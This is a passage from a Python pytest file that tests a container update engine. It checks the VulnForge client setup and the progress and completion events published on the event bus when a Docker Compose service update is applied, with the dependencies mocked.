            with patch.object(VulnForgeClient, "__init__", return_value=None) as mock_init:
                await UpdateEngine._get_vulnforge_client(mock_db)

                mock_init.assert_called_once_with(
                    base_url="http://vulnforge:8080",
                    auth_type="api_key",
                    api_key="test-key-123",
                    username=None,
                    password=None
                )


class TestEventBusProgress:
    """Test suite for event bus progress notifications."""

    @pytest.mark.asyncio
    async def test_apply_update_publishes_starting_event(self, make_update):
        """Test apply_update publishes 'starting' progress event."""
        mock_db = AsyncMock()

        update = make_update(
            id=1,
            container_id=1,
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="approved",
            reason_type="feature",
            reason_summary="Test",
            cves_fixed=[]
        )

        container = Container(
            id=1,
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="3.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr"
        )

        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        events = []
        async def capture_event(event):
            events.append(event)

        with patch.object(UpdateEngine, "_backup_compose_file", AsyncMock(side_effect=Exception("Stop here"))), \
             patch("app.services.event_bus.event_bus.publish", capture_event):

            try:
                await UpdateEngine.apply_update(mock_db, 1, "user")
            except:
                pass  # Expected to fail

            # Should have published 'update-progress' event with phase='starting'
            starting_events = [e for e in events if e.get("phase") == "starting"]
            assert len(starting_events) > 0
            assert starting_events[0]["type"] == "update-progress"

    @pytest.mark.asyncio
    async def test_apply_update_publishes_complete_event_on_success(self, make_update):
        """Test apply_update publishes 'update-complete' event on success."""
        mock_db = AsyncMock()
        mock_db.add = MagicMock()
        mock_db.commit = AsyncMock()
        mock_db.refresh = AsyncMock()

        # Mock context manager for begin_nested
        mock_nested = AsyncMock()
        mock_nested.__aenter__ = AsyncMock()
        mock_nested.__aexit__ = AsyncMock()
        mock_db.begin_nested = MagicMock(return_value=mock_nested)

        update = make_update(
            id=1,
            container_id=1,
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="approved",
            reason_type="feature",
            reason_summary="Test",
            cves_fixed=[]
        )

        container = Container(
            id=1,
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="3.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_url="http://localhost:8989/ping"
        )

        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        events = []
        async def capture_event(event):
            events.append(event)

        with patch.object(UpdateEngine, "_backup_compose_file", AsyncMock(return_value="/data/backups/test")), \
             patch("app.services.compose_parser.ComposeParser.update_compose_file", AsyncMock(return_value=True)), \
             patch.object(UpdateEngine, "_pull_docker_image", AsyncMock(return_value={"success": True})), \
             patch.object(UpdateEngine, "_execute_docker_compose", AsyncMock(return_value={"success": True})), \
             patch.object(UpdateEngine, "_validate_health_check", AsyncMock(return_value={"success": True, "method": "http_check"})), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", capture_event):

            await UpdateEngine.apply_update(mock_db, 1, "user")

            # Should have published 'update-complete' event with status='success'
            complete_events = [e for e in events if e.get("type") == "update-complete"]
            assert len(complete_events) > 0
            assert complete_events[0]["status"] == "success"
